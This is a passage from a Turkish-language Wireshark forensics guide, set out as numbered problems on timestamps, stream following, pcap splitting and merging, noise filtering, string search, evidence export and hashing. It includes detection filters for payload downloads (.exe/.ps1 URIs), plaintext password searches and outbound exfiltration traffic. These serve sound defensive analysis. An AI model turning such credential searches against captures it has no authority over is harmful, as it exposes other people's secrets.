2. Hangisinin SYN-ACK döndüğüne (yani portu açık olduğuna) bak. Saldırı açık porttan girer.
3. Kurban adayının saldırı sonrasındaki davranışına bak: yeni dış bağlantılar, dosya indirme, garip DNS sorguları.
4. Kimlik için DHCP'de hostname (option 12), NBNS'de makine adı, Kerberos'ta kullanıcı adını ara (Problem 032).
5. Cevap olarak IP + hostname + (varsa) kullanıcı adını birlikte ver.

**Terimler:**

- **Kurban (victim)**: Saldırıya uğrayan veya zararlı çalıştıran makine.
- **SYN-ACK**: Sunucunun "evet, konuşabiliriz" cevabı; portun açık olduğunu gösterir.
- **Hostname**: Makinenin adı (ör. DESKTOP-4F2K).

> **Anlık karar:** IP tek başına zayıf kanıttır (DHCP ile değişebilir). Hostname veya MAC ile eşleştirmeden "kurban budur" deme.


</details>

<details>
<summary><strong>007 · Saat dilimi karmaşası: zaman damgalarını doğru okumak</strong></summary>

**Metafor:** Yurt dışında çekilmiş bir fotoğrafın saatine bakıp "gece çekilmiş" demek, saat farkını unutmaktır. Pcap saati, yakalayan cihazın saatidir.

**Senden istenen:** "Olay yerel saatle kaçta oldu?", "Log kaydındaki saatle pcap'teki paketi eşleştir."

**Filtreler (araştırma yolu):**

- `frame.time >= "2024-03-01 14:00:00" && frame.time <= "2024-03-01 14:10:00"` → görüntülenen (yerel) saate göre aralık
- `frame.time_epoch >= 1709301600` → saat diliminden bağımsız epoch (saniye) karşılaştırması

**Menü / araç:**

- View ▸ Time Display Format ▸ UTC Date and Time of Day veya Date and Time of Day (yerel)
- Edit ▸ Preferences ▸ Appearance ▸ Columns → ikinci bir zaman sütunu ekle (biri UTC, biri yerel)

**Filtreden sonra yol tarifi:**

1. Önce sorunun hangi saat dilimini istediğini netleştir.
2. Wireshark ekranda saati senin bilgisayarının saat dilimine göre gösterir. UTC seçeneğiyle karşılaştır, farkı not et.
3. Log (Windows Event Log, firewall) ile eşleştireceksen logun saat dilimini de öğren.
4. En güvenli karşılaştırma epoch değeridir; saat dilimi içermez.
5. Raporda her saati "UTC" etiketiyle yaz.

**Terimler:**

- **Epoch**: 1 Ocak 1970 00:00 UTC'den beri geçen saniye sayısı.
- **frame.time**: Paketin mutlak tarih-saati.
- **frame.time_relative**: Kaydın başından beri geçen saniye.

> **Anlık karar:** Farklı kaynakları birleştiriyorsan her şeyi UTC'ye çevir. Tek dil, tek saat.


</details>

<details>
<summary><strong>008 · Olayın ilk paketini (sıfır anı) bulmak</strong></summary>

**Metafor:** Domino taşlarının hangisinin ilk devrildiğini bulmak. Sonraki tüm taşlar o ilk itişin sonucudur.

**Senden istenen:** "Saldırganın ilk teması ne zaman?", "İlk zararlı istek hangi paket numarasında?"

**Filtreler (araştırma yolu):**

- `ip.addr == 10.0.0.99` → şüpheli IP'nin tüm trafiği; ilk satır ilk temas
- `dns.qry.name contains "kotu-alan"` → zararlı alan adının ilk sorgulandığı an
- `http.request.uri contains ".exe" || http.request.uri contains ".ps1"` → ilk payload indirme

**Filtreden sonra yol tarifi:**

1. Şüpheli IP veya alan adını filtrele ve No. sütunu artan sırada olduğundan emin ol.
2. İlk satırı seç; zaman sütununu ve paket numarasını not et.
3. Bu andan biraz öncesine bak (filtreyi kaldırıp o paket numarasına git: Ctrl+G). Tetikleyici ne? Bir e-posta, bir web sayfası, bir DNS sorgusu?
4. Zinciri geriye doğru izle: payload'dan önce DNS sorgusu, ondan önce belki bir HTTP sayfası vardır.
5. Sıfır anını tespit edince paketi işaretle (Ctrl+M) ve yorum ekle.

**Terimler:**

- **Patient zero**: Salgındaki ilk vaka; burada ilk ele geçirilen makine veya ilk zararlı olay.
- **Ctrl+G**: Belirli paket numarasına git.

> **Anlık karar:** Filtrelenmiş ekranda "ilk" görünen, gerçekten ilk olmayabilir. Filtreyi kaldırıp hemen öncesine bakmayı alışkanlık yap.


</details>

<details>
<summary><strong>009 · Belirli bir zaman aralığına odaklanmak</strong></summary>

**Metafor:** Uzun bir filmde sadece cinayet sahnesini izlemek için ileri sarmak.

**Senden istenen:** "14:00-14:05 arasında hangi hostlar iletişim kurdu?", "Alarm saatinin ±2 dakikasında ne oldu?"

**Filtreler (araştırma yolu):**

- `frame.time >= "2024-03-01 14:00:00" && frame.time <= "2024-03-01 14:05:00"` → mutlak saat aralığı
- `frame.time_relative >= 120 && frame.time_relative <= 300` → kaydın 2. ile 5. dakikası arası

**Komut satırı:**

```bash
editcap -A "2024-03-01 14:00:00" -B "2024-03-01 14:05:00" kanit.pcapng aralik.pcapng
```

**Filtreden sonra yol tarifi:**

1. Alarm/olay saatini al, ±2-5 dakikalık pencere oluştur.
2. Filtreyi uygula; sonra Statistics menüsündeki pencerelerde "Limit to display filter" kutusunu işaretle, istatistikler sadece bu pencere için hesaplanır.
3. Çok büyük dosyada editcap ile o aralığı ayrı dosyaya kes, Wireshark daha hızlı çalışır.
4. Pencereyi gerektikçe genişlet; olaylar bazen alarmdan dakikalar önce başlar.

**Terimler:**

- **editcap**: Pcap'i kesen, bölen, düzenleyen komut satırı aracı.
- **Limit to display filter**: İstatistik pencerelerini sadece filtrelenmiş paketlerle sınırlayan kutucuk.

> **Anlık karar:** Alarm saati "sonuç" anıdır, sebep daha öncedir. Pencereyi her zaman geriye doğru daha geniş tut.


</details>

<details>
<summary><strong>010 · Dev pcap dosyası açılmıyor veya çok yavaş</strong></summary>

**Metafor:** Bir kütüphanenin tamamını tek seferde okumaya çalışmak yerine ilgili rafı ödünç almak.

**Senden istenen:** Birkaç GB'lık pcap'te analiz yapabilmek.

**Komut satırı:**

```bash
capinfos kanit.pcapng
editcap -c 500000 kanit.pcapng parca.pcapng
tshark -r kanit.pcapng -Y 'ip.addr == 10.0.0.5' -w sadece_supheli.pcapng
editcap -i 3600 kanit.pcapng saatlik.pcapng
```

**Filtreden sonra yol tarifi:**

1. capinfos ile boyutu ve paket sayısını öğren.
2. Önce tshark ile ilgilendiğin IP/protokolü süzüp küçük bir dosyaya yaz; Wireshark'ta bu küçük dosyayı aç.
3. Hedefin belli değilse editcap ile paket sayısına (-c) veya zamana (-i saniye) göre parçalara böl.
4. Wireshark'ta ağır özellikleri kapat: View ▸ Name Resolution kapalı, Edit ▸ Preferences ▸ Protocols ▸ TCP'de "Allow subdissector to reassemble TCP streams" gerekirse kapat.
5. İstatistikleri komut satırında üret (tshark -q -z ...), GUI'yi sadece detay için kullan.

**Terimler:**

- **tshark**: Wireshark'ın komut satırı hali; aynı filtreleri kullanır.
- **Reassembly**: Parçalara bölünmüş veriyi birleştirme; hafıza ve zaman tüketir.

> **Anlık karar:** Büyük dosyada kural: önce komut satırında daralt, sonra GUI'de derinleş.


</details>

<details>
<summary><strong>011 · Birden fazla pcap'i birleştirmek ve sıralamak</strong></summary>

**Metafor:** Farklı kameralardan gelen kayıtları tek bir zaman çizgisinde montajlamak.

**Senden istenen:** Farklı sensörlerden (ör. firewall önü ve arkası) gelen kayıtları tek akışta incelemek.

**Filtreler (araştırma yolu):**

- `frame.interface_id == 1` → birleşik pcapng'de ikinci kaynaktan gelen paketler

**Menü / araç:**

- File ▸ Merge → GUI ile birleştirme (kronolojik seçenek)

**Komut satırı:**

```bash
mergecap -w birlesik.pcapng sensor1.pcapng sensor2.pcapng
mergecap -a -w ardisik.pcapng parca1.pcapng parca2.pcapng
```

**Filtreden sonra yol tarifi:**

1. Kayıtların saatlerinin senkron olup olmadığını kontrol et (aynı olay iki dosyada aynı saatte mi?).
2. mergecap varsayılan olarak zamana göre sıralar; dosyalar ardışık parçalarsa -a ile uç uca ekle.
3. Aynı paket iki sensörde de görüldüyse çift kopya oluşur; editcap -d ile kopyaları temizleyebilirsin.
4. Hangi paketin hangi kaynaktan geldiğini frame.interface_id veya interface adıyla ayırt et.

**Terimler:**

- **mergecap**: Pcap birleştirme aracı.
- **Duplicate**: Aynı paketin iki kez kaydedilmesi.

> **Anlık karar:** Birleştirmeden önce saat kaymasını kontrol et; kaymış saatlerle birleşik zaman çizgisi yalan söyler.


</details>

<details>
<summary><strong>012 · Bir TCP konuşmasını baştan sona okumak (Follow Stream)</strong></summary>

**Metafor:** Paketler bir mektubun parçalanmış sayfalarıdır. Follow Stream sayfaları sıraya koyup mektubu tek seferde okumanı sağlar.

**Senden istenen:** "Saldırgan hangi komutları çalıştırdı?", "Sunucu ne cevap verdi?", "Dosyanın içinde ne yazıyor?"

**Filtreler (araştırma yolu):**

- `tcp.stream == 5` → 5 numaralı akışın tüm paketleri

**Menü / araç:**

- Paket seç ▸ sağ tık ▸ Follow ▸ TCP Stream (Ctrl+Alt+Shift+T)
- Follow penceresinde: kırmızı = istemci, mavi = sunucu; "Show data as" ile ASCII/Hex/Raw/YAML seç

**Filtreden sonra yol tarifi:**

1. İlgili bir pakete sağ tıkla ve Follow ▸ TCP Stream seç. Wireshark otomatik olarak tcp.stream filtresi uygular.
2. Kırmızı ve mavi metni sırayla oku: kim ne istedi, ne cevap aldı.
3. Pencerenin altındaki "Stream" kutusuyla sonraki/önceki akışa geç; aynı saldırının devamı genelde sonraki akışlardadır.
4. İkili veri (dosya) varsa "Show data as: Raw" seçip "Save as" ile kaydet.
5. Sadece tek yönü görmek için açılır menüden yönü seç (ör. sadece sunucunun gönderdiği).

**Terimler:**

- **Stream**: Wireshark'ın her TCP bağlantısına verdiği sıra numarası (0'dan başlar).
- **ASCII**: Okunabilir metin gösterimi.
- **Raw**: Ham byte; dosya kaydetmek için doğru format.

> **Anlık karar:** Komut, parola, flag, dosya içeriği soruluyorsa ilk refleksin Follow Stream olsun. UDP için Follow ▸ UDP Stream, TLS çözülmüşse Follow ▸ TLS Stream.


</details>

<details>
<summary><strong>013 · Stream numarasıyla gezinmek: tcp.stream mantığı</strong></summary>

**Metafor:** Her TCP bağlantısı bir otel odasıdır, tcp.stream oda numarasıdır. Oda numarasını bilirsen o odada ne konuşulduğunu kolayca dinlersin.

**Senden istenen:** "Kaçıncı TCP oturumunda dosya indirildi?", "Bu bağlantıda kaç paket var?"

**Filtreler (araştırma yolu):**

- `tcp.stream == 12` → sadece 12 numaralı bağlantı
- `tcp.stream in {12, 13, 14}` → ardışık birkaç bağlantı
- `tcp.stream >= 100 && tcp.stream <= 120` → bir aralıktaki bağlantılar
- `udp.stream == 3` → UDP için aynı mantık

**Filtreden sonra yol tarifi:**

1. Paket detayında Transmission Control Protocol ▸ [Stream index: N] satırına bak.
2. Bu satıra sağ tıklayıp Apply as Column de; artık her paketin stream numarasını listede görürsün.
3. Saldırı birden fazla bağlantıya yayılmışsa ardışık stream numaralarını in {..} ile birlikte filtrele.
4. Conversations ▸ TCP penceresinde her satır bir stream'dir; oradan Follow Stream da açabilirsin.

**Terimler:**

- **Stream index**: Wireshark'ın hesapladığı, protokolde olmayan yardımcı bir alan (köşeli parantezle gösterilir).
- **Köşeli parantezli alanlar**: [ ] içindeki alanlar Wireshark'ın çıkarımıdır, pakette yazmaz.

> **Anlık karar:** Bir bağlantıyı bir kez bulduysan IP/port ile değil, tcp.stream ile takip et. Daha kısa, daha hatasız.


</details>

<details>
<summary><strong>014 · Paket detayında aradığım alanın filtre adını bulmak</strong></summary>

**Metafor:** Bir mağazada ürünün adını bilmiyorsan rafta gösterip "bundan istiyorum" dersin. Wireshark'ta da alana tıklarsın, adı alt barda yazar.

**Senden istenen:** "Şu alanı filtrelemek istiyorum ama adını bilmiyorum" durumu. Her analistin günde 50 kez yaşadığı durum.

**Filtreler (araştırma yolu):**

- `http.host` → alan var mı? (sadece adı yazmak = bu alanı içeren paketler)
- `!http.host` → bu alanı içermeyen paketler

**Menü / araç:**

- Paket detayında alana tıkla → pencerenin en altındaki durum çubuğunda alanın filtre adı görünür (ör. http.host)
- Alana sağ tık ▸ Apply as Filter ▸ Selected → filtreyi senin yerine yazar
- Alana sağ tık ▸ Prepare as Filter → uygulamadan filtre çubuğuna koyar, düzenleyip Enter'a basarsın
- View ▸ Internals ▸ Supported Protocols veya Edit ▸ Expression... → tüm alanların aranabilir listesi

**Filtreden sonra yol tarifi:**

1. İlgilendiğin paketi seç, detay panelinde ilgili satırı bul.
2. Satıra tıkla ve alttaki durum çubuğundan alan adını oku.
3. Sağ tık ▸ Apply as Filter ▸ Selected / Not Selected / ...and Selected / ...or Selected seçenekleriyle filtreyi büyüt.
4. Filtre çubuğu yeşilse geçerli, kırmızıysa hatalı, sarıysa "çalışır ama beklenmedik sonuç verebilir" demektir.

**Terimler:**

- **Display filter**: Yakalanmış paketleri ekranda süzmek için kullanılan filtre dili.
- **Field (alan)**: Paketteki tek bir bilgi parçası (ör. ip.src, http.user_agent).

> **Anlık karar:** Filtre adını ezberlemeye çalışma; tıkla-oku-sağ tık alışkanlığı ezberden hızlıdır.


</details>

<details>
<summary><strong>015 · Gürültüyü elemek: bilinen iyi trafiği dışarıda bırakmak</strong></summary>

**Metafor:** Bir kalabalığın içinde şüpheliyi bulmak için önce üniformalı polisleri ve görevlileri kenara çekmek.

**Senden istenen:** Binlerce paket içinde anormali görebilmek.

**Filtreler (araştırma yolu):**

- `!(arp || dns || mdns || ssdp || llmnr || nbns || icmpv6 || stp || lldp || cdp)` → ağın "arka plan uğultusu"nu kaldır
- `!(ip.addr == 10.0.0.1) && !(tls.handshake.extensions_server_name contains "microsoft")` → bilinen gateway ve Microsoft trafiğini çıkar
- `!(udp.port == 53) && !(tcp.port == 443)` → önce şifreli olmayan, TLS/DNS dışı trafiğe bak

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'den çok yer kaplayan ama sıkıcı protokolleri belirle (SSDP, mDNS, LLMNR, NetBIOS gibi yayın trafiği).
2. Bunları ! (değil) ile dışarıda bırak.
3. Bilinen meşru hedefleri (Windows Update, antivirüs, CDN) adım adım ekle.
4. Kalan trafikte gözüne çarpanı işaretle; sonra filtreyi kaldırıp bağlamına bak.
5. Sık kullandığın eleme filtresini filtre çubuğunun yanındaki yer imi (bookmark) ikonundan kaydet.

**Terimler:**

- **Noise (gürültü)**: Analizle ilgisi olmayan, sürekli dönen arka plan trafiği.
- **Broadcast/multicast**: Tüm ağa veya bir gruba aynı anda gönderilen trafik.
- **! / not**: Mantıksal "değil"; koşulu tersine çevirir.

> **Anlık karar:** `ip.addr != X` yerine `!(ip.addr == X)` yaz. Tersi, iki yönlü alanlarda beklediğinden farklı sonuç verebilir.


</details>

<details>
<summary><strong>016 · Paketlerde bir kelime veya string aramak (Find Packet)</strong></summary>

**Metafor:** Kitabın dizininde bulamadığın kelimeyi Ctrl+F ile sayfalarda aramak.

**Senden istenen:** "flag{", "password", bir dosya adı, bir kullanıcı adı gibi değerleri bulmak.

**Filtreler (araştırma yolu):**

- `frame contains "password"` → tüm paket byte'larında büyük/küçük harf duyarlı arama
- `frame matches "passw(or)?d"` → regex ile, büyük/küçük harf duyarsız arama
- `frame contains 4d:5a:90:00` → hex dizisi arama (burada MZ/EXE başlığı)
- `tcp.payload contains "flag{"` → sadece TCP yükünde arama

**Menü / araç:**

- Edit ▸ Find Packet (Ctrl+F) → arama tipi: Display filter / Hex value / String / Regular Expression; arama yeri: Packet list / Packet details / Packet bytes

**Filtreden sonra yol tarifi:**

1. Kelimeyi biliyorsan önce `frame contains` ile filtrele; kaç pakette geçtiğini görürsün.
2. Büyük/küçük harf emin değilsen `matches` kullan (Wireshark'ta matches varsayılan olarak harf duyarsızdır).
3. Bulunan pakette Follow Stream aç, kelimenin bağlamını oku.
4. Kelime bulunamıyorsa veri sıkıştırılmış (gzip), şifreli (TLS) veya kodlanmış (base64) olabilir; Problem 183 ve 128'e bak.

**Terimler:**

- **contains**: Alan/çerçeve içinde birebir eşleşme arar, harf duyarlı.
- **matches**: Düzenli ifade (regex) ile arar.
- **Regex**: Metin kalıbı tanımlama dili (ör. `[0-9]+` "bir veya daha fazla rakam").

> **Anlık karar:** `frame contains` bulamıyorsa pes etme; `http.file_data contains` dene. HTTP gövdesi gzip ise Wireshark'ın açtığı (decompressed) hali sadece http.file_data'da aranabilir.


</details>

<details>
<summary><strong>017 · Standart dışı port: Wireshark protokolü tanımıyor (Decode As)</strong></summary>

**Metafor:** Biri Fransızca konuşuyor ama sen kapının üstünde "İngilizce" yazdığı için İngilizce dinlemeye çalışıyorsun. Decode As, "bu kişi aslında Fransızca konuşuyor" demektir.

**Senden istenen:** 8080'de HTTP, 4444'te TLS, 53'te DNS olmayan bir şey gibi durumları çözmek.

**Filtreler (araştırma yolu):**

- `tcp.port == 8888 && data` → tanınmamış veri taşıyan port
- `tcp.port == 8888 && http` → Decode As sonrası HTTP olarak görünür

**Menü / araç:**

- Paket seç ▸ Analyze ▸ Decode As... → port ve protokolü eşle (ör. TCP port 8888 → HTTP)
- Edit ▸ Preferences ▸ Protocols ▸ HTTP ▸ TCP ports → kalıcı port ekleme

**Filtreden sonra yol tarifi:**

1. Paket listesinde Protocol sütunu "TCP" veya "Data" kalan ama içerik taşıyan paketleri bul.
2. Follow Stream ile içeriğe bak: "GET /" görüyorsan HTTP, 16 03 01 ile başlıyorsa TLS, "SSH-2.0" görüyorsan SSH.
3. Analyze ▸ Decode As ile portu doğru protokole ata.
4. Artık o protokolün filtreleri (http.request.uri vb.) çalışır.
5. Port-protokol uyumsuzluğunun kendisi de bir bulgudur, raporuna ekle (Problem 067).

**Terimler:**

- **Heuristic dissector**: Port yerine içeriğe bakarak protokolü tahmin eden çözücü.
- **Dissector**: Wireshark'ın bir protokolü çözümleyen modülü.

> **Anlık karar:** İçerik okunuyor ama filtre çalışmıyorsa sorun büyük ihtimalle port tanımadır. İlk iş Decode As.


</details>

<details>
<summary><strong>018 · Hostname'leri görmek: isim çözümleme ayarları</strong></summary>

**Metafor:** Telefon rehberi olmadan sadece numaralarla kimin aradığını anlamaya çalışmak. İsim çözümleme rehberi açar.

**Senden istenen:** IP yerine alan adı veya makine adı görmek, IP-isim eşleşmesi yapmak.

**Filtreler (araştırma yolu):**

- `dns.a == 93.184.216.34` → bu IP'yi döndüren DNS cevabı (IP'nin adını bulmak)
- `ip.dst_host contains "kotu"` → isim çözümlemesiyle oluşan host adı içinde arama

**Menü / araç:**

- View ▸ Name Resolution ▸ Resolve Network Addresses → IP yerine pcap'teki DNS cevaplarından isim gösterir
- Edit ▸ Preferences ▸ Name Resolution ▸ "Use captured DNS packet data" açık, "Use an external network name resolver" kapalı
- Statistics ▸ Resolved Addresses → pcap içinden çıkarılmış tüm IP-isim eşleşmeleri

**Filtreden sonra yol tarifi:**

1. Network name resolution'ı aç ama harici DNS sorgusunu kapat (canlı sorgu hem iz bırakır hem bugünkü cevabı verir, olay anındakini değil).
2. Statistics ▸ Resolved Addresses ile tüm eşleşmeleri tek listede gör.
3. Bir IP'nin adını kanıtlamak için dns.a filtresiyle DNS cevabını bul ve paket numarasını rapora koy.
4. Rapor ve kanıtta IP'yi esas al, ismi açıklama olarak ekle.

**Terimler:**

- **Name resolution**: IP/MAC/port numaralarını isimlere çevirme.
- **OUI**: MAC adresinin ilk 3 byte'ı; üretici firmayı gösterir (ör. VMware, Apple).

> **Anlık karar:** Harici çözümleme açıksa Wireshark analiz bilgisayarından canlı DNS sorgusu yapar. Zararlı alanları sorgulamak hem OPSEC hatası hem yanlış sonuçtur.


</details>

<details>
<summary><strong>019 · DFIR için özel profil ve sütunlar kurmak</strong></summary>

**Metafor:** Bir cerrahın ameliyathanesi her seferinde aynı düzende hazırlanır. Wireshark profili senin hazır ameliyat masandır.

**Senden istenen:** Her vakada aynı ayarları tekrar tekrar yapmamak, hız kazanmak.

**Filtreler (araştırma yolu):**

- `http.host || tls.handshake.extensions_server_name` → bu iki alanı sütun yaparsan web/TLS hedefleri tek sütunda görünür

**Menü / araç:**

- Edit ▸ Configuration Profiles ▸ + → "DFIR" adlı profil
- Edit ▸ Preferences ▸ Appearance ▸ Columns → sütun ekle
- Alan üzerinde sağ tık ▸ Apply as Column → hızlı sütun ekleme

**Filtreden sonra yol tarifi:**

1. Yeni profil oluştur (sağ alttaki "Profile" yazısına tıklayarak da geçebilirsin).
2. Zaman formatını UTC Date and Time yap.
3. Şu sütunları ekle: Source Port (tcp.srcport/udp.srcport), Destination Port, http.host, tls.handshake.extensions_server_name, dns.qry.name, tcp.stream, frame.len.
4. Varsayılan "Protocol" ve "Info" sütunlarını koru; Info hızlı özet verir.
5. Sık kullandığın filtreleri filtre çubuğunun sağındaki "+" ile buton olarak ekle (Problem 244).

**Terimler:**

- **Configuration Profile**: Sütunlar, renkler, filtre butonları ve tercihlerin kaydedildiği ayar paketi.
- **Custom column**: Herhangi bir alanı liste görünümünde sütun olarak göstermek.

> **Anlık karar:** Profili bir kez kur, her vakada 10 dakika kazan. Profil klasörünü yedekleyip başka bilgisayara taşıyabilirsin.


</details>

<details>
<summary><strong>020 · Kritik paketleri işaretleyip yorumlamak (mark/comment)</strong></summary>

**Metafor:** Kitabı okurken önemli sayfalara yapışkan not yapıştırmak.

**Senden istenen:** Bulgularını kanıt dosyasının içinde saklamak ve rapora hızlı dönmek.

**Filtreler (araştırma yolu):**

- `frame.marked == 1` → işaretli paketler
- `frame.comment` → yorum eklenmiş paketler
- `frame.comment contains "ilk temas"` → belirli yorumu içeren paket

**Menü / araç:**

- Paket seç ▸ Ctrl+M → işaretle (siyah satır)
- Paket seç ▸ sağ tık ▸ Packet Comment (Ctrl+Alt+C) → yorum yaz
- Analyze ▸ Expert Information ▸ Comment sekmesi → tüm yorumlar tek listede

**Filtreden sonra yol tarifi:**

1. Her önemli bulguda paketi işaretle ve "NE + NEDEN" formatında yorum yaz (ör. "Saldırgan 10.0.0.5 ilk SYN, port taraması başlangıcı").
2. Dosyayı pcapng olarak kaydet (File ▸ Save As). Yorumlar sadece pcapng'de saklanır.
3. Rapor yazarken frame.comment filtresiyle tüm bulguları sırayla listele.
4. İşaretli paketleri ayrı bir dosyaya da çıkarabilirsin (Problem 021).

**Terimler:**

- **Mark**: Oturum boyunca geçerli görsel işaret (dosyaya kaydedilmez, yorum kaydedilir).
- **pcapng**: Yorum saklayabilen pcap formatı.

> **Anlık karar:** Orijinal kanıt dosyasının üzerine asla kaydetme. Yorumlu halini farklı isimle kaydet.


</details>

<details>
<summary><strong>021 · Bulguyu ayrı bir pcap olarak dışa aktarmak (kanıt alt kümesi)</strong></summary>

**Metafor:** Bütün güvenlik kamerası arşivini değil, sadece olay anının klibini savcılığa göndermek.

**Senden istenen:** Sadece ilgili trafiği başka ekibe/rapora/araca vermek.

**Filtreler (araştırma yolu):**

- `ip.addr == 10.0.0.5 && ip.addr == 10.0.0.20` → iki host arasındaki tüm trafik
- `frame.marked == 1` → sadece işaretlediğin paketler

**Menü / araç:**

- Filtre uygula ▸ File ▸ Export Specified Packets ▸ "All packets: Displayed" → yeni pcapng
- File ▸ Export Packet Dissections ▸ As Plain Text / CSV / JSON → okunur rapor eki

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'tcp.stream == 7' -w akis7.pcapng
```

**Filtreden sonra yol tarifi:**

1. Kapsayıcı bir filtre yaz (çok dar filtre bağlamı kaybettirir; ör. sadece HTTP değil, o bağlantının TCP el sıkışmasını da al).
2. Export Specified Packets'te "Displayed" seçeneğini işaretle.
3. Dışa aktarılan dosyanın hash'ini al ve orijinal dosya adıyla birlikte not et (Problem 025).
4. Dosya adına vaka numarası, tarih ve içerik yaz (ör. VAKA12_2024-03-01_c2_trafigi.pcapng).

**Terimler:**

- **Subset**: Orijinal kanıttan çıkarılmış alt küme.
- **Chain of custody**: Kanıtın kimden kime, ne zaman, nasıl geçtiğinin kaydı.

> **Anlık karar:** TCP akışı dışa aktarırken `tcp.stream == N` kullan; IP+port filtresi el sıkışmayı veya kapanışı kaçırabilir.


</details>

<details>
<summary><strong>022 · Expert Info ile anormallikleri hızla görmek</strong></summary>

**Metafor:** Arabanın gösterge panelindeki uyarı ışıkları. Motor arızasının yerini söylemez ama nereye bakacağını söyler.

**Senden istenen:** Bağlantı hataları, bozuk paketler, tekrar gönderimler, protokol ihlallerini hızlıca toplamak.

**Filtreler (araştırma yolu):**

- `_ws.expert.severity >= "warning"` → sadece uyarı ve hata seviyesindeki paketler
- `_ws.expert` → Wireshark'ın herhangi bir uzman notu düştüğü paketler
- `_ws.malformed` → bozuk/hatalı biçimlendirilmiş paketler (fuzzing, istismar, gizli kanal)

**Menü / araç:**

- Analyze ▸ Expert Information (ya da sol alttaki renkli yuvarlak ikon)

**Filtreden sonra yol tarifi:**

1. Expert Information penceresini aç, Severity'ye göre grupla.
2. Error ve Warning gruplarını genişlet; her satır tıklanınca ilgili pakete gider.
3. Malformed paketlere özellikle bak: istismar denemeleri (exploit) sıklıkla protokolü bozar.
4. Chat (mavi) seviyesi normal olayları (bağlantı açılışı, GET isteği) gösterir; hikâyeyi hızlıca özetlemek için faydalıdır.

**Terimler:**

- **Expert Info**: Wireshark'ın tespit ettiği olağan dışı durumlar listesi.
- **Malformed**: Protokol kurallarına uymayan, çözülemeyen paket.
- **Severity**: Önem derecesi: Chat < Note < Warning < Error.

> **Anlık karar:** Expert Info "kötü niyet" demez, "tuhaflık" der. Tuhaflığı sonra bağlamla yorumlarsın.


</details>

<details>
<summary><strong>023 · Zaman içinde trafik grafiği: IO Graph ile ani artış (spike) bulmak</strong></summary>

**Metafor:** Kalp ritim grafiğinde ani sıçrama, doktora "şu ana bak" der.

**Senden istenen:** "Saldırı ne zaman yoğunlaştı?", "Veri sızdırma hangi dakikada oldu?", "Periyodik bağlantı var mı?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.0/8)` → iç makineden dışarı giden trafik (grafiğe filtre olarak ver)
- `tcp.flags.syn == 1 && tcp.flags.ack == 0` → SYN grafiği: tarama/flood anlarını gösterir
- `dns` → DNS grafiği: tünelleme/DGA patlamaları

**Menü / araç:**

- Statistics ▸ I/O Graphs → her satıra ayrı display filter verilebilir

**Filtreden sonra yol tarifi:**

1. I/O Graphs'ı aç, varsayılan "All packets" çizgisini bırak.
2. + ile yeni çizgi ekle, display filter kısmına şüpheli trafiği yaz; Y Axis'i "Bytes" veya "Packets" seç.
3. Interval'i olayın ölçeğine göre ayarla (saniye/10 saniye/dakika).
4. Grafikteki tepe noktasına tıkla; Wireshark o andaki pakete gider.
5. Düzenli aralıklı küçük dişler (testere dişi) beacon'a işaret eder (Problem 176).

**Terimler:**

- **I/O Graph**: Zamana göre paket/byte miktarını çizen grafik.
- **Interval**: Grafikteki her noktanın kapsadığı zaman dilimi.
- **Spike**: Ani yükseliş.

> **Anlık karar:** Grafik "ne zaman"ı söyler; sonra o zamana zoom yapıp "ne"yi paketlerde ararsın.


</details>

<details>
<summary><strong>024 · Kaç paket, kaç byte? Sayma ve istatistik soruları</strong></summary>

**Metafor:** Muhasebeci gibi düşün: soruda sayı isteniyorsa doğru defteri (filtreyi) açıp toplamı okumak.

**Senden istenen:** "Kaç DNS sorgusu var?", "Saldırgan kaç farklı porta bağlandı?", "Kaç byte veri sızdırıldı?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0` → sadece DNS sorguları (cevaplar hariç)
- `ip.src == 10.0.0.5 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → saldırganın bağlantı denemeleri

**Menü / araç:**

- Filtre uygula → durum çubuğunda "Displayed: N" sayısı
- Statistics ▸ Conversations / Endpoints → "Limit to display filter" ile filtreli sayım

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 0' | wc -l
tshark -r kanit.pcapng -Y 'ip.src == 10.0.0.5 && tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e tcp.dstport | sort -u | wc -l
```

**Filtreden sonra yol tarifi:**

1. Sorunun neyi saydığını netleştir: paket mi, bağlantı mı, benzersiz değer mi, byte mı?
2. Paket sayısı için filtre + durum çubuğu yeterli.
3. Benzersiz değer (farklı port, farklı alan adı) için tshark -T fields + sort -u + wc -l kullan.
4. Byte için Conversations penceresindeki Bytes sütununu veya Statistics ▸ Capture File Properties'teki "Displayed" sütununu kullan.

**Terimler:**

- **-T fields -e**: tshark'ta sadece istenen alanları yazdırma.
- **sort -u**: Tekrarları kaldırıp sıralama.

> **Anlık karar:** "Kaç" sorusunda en sık hata: sorgu+cevabı birlikte saymak veya retransmission'ları çift saymak. Filtreni buna göre daralt.


</details>

<details>
<summary><strong>025 · Pcap'in değişmediğini kanıtlamak: hash ve kanıt bütünlüğü</strong></summary>

**Metafor:** Mühürlü delil torbası. Torba açılmadıysa içindeki de değişmemiştir; hash dijital mühürdür.

**Senden istenen:** Analiz öncesi ve sonrası kanıtın değişmediğini göstermek, raporda kanıt kimliği vermek.

**Menü / araç:**

- Statistics ▸ Capture File Properties → dosyanın SHA256 ve SHA1 değerleri burada da görünür

**Komut satırı:**

```bash
sha256sum kanit.pcapng
capinfos -H kanit.pcapng
```

**Filtreden sonra yol tarifi:**

1. Kanıtı aldığın anda SHA256 hash'ini hesapla ve kayda geçir.
2. Orijinal dosyayı salt okunur bir yerde sakla, analizi kopyası üzerinde yap.
3. Dışa aktardığın her alt kümenin de hash'ini al.
4. Raporda "Analiz edilen dosya: ad, boyut, SHA256" bilgisini ver.

**Terimler:**

- **Hash**: Dosyanın parmak izi; tek bit değişse tamamen farklı çıkar.
- **SHA256**: Güncel standart hash algoritması (MD5 ve SHA1 artık zayıf kabul edilir).
- **Integrity (bütünlük)**: Verinin değişmediğinin güvencesi.

> **Anlık karar:** Wireshark'ta "Save" tuşuna basmak pcap'i yeniden yazabilir. Orijinali her zaman kopyadan analiz et.


</details>

## B · Yerel Ağ ve IP Katmanı: ARP, DHCP, ICMP, IPv6, VLAN

*Binanın koridorları ve posta kutuları. Saldırgan içeri girdikten sonra ilk burada iz bırakır: kendini başkası gibi tanıtır, adresleri karıştırır, gizli tüneller kazar.*

<details>
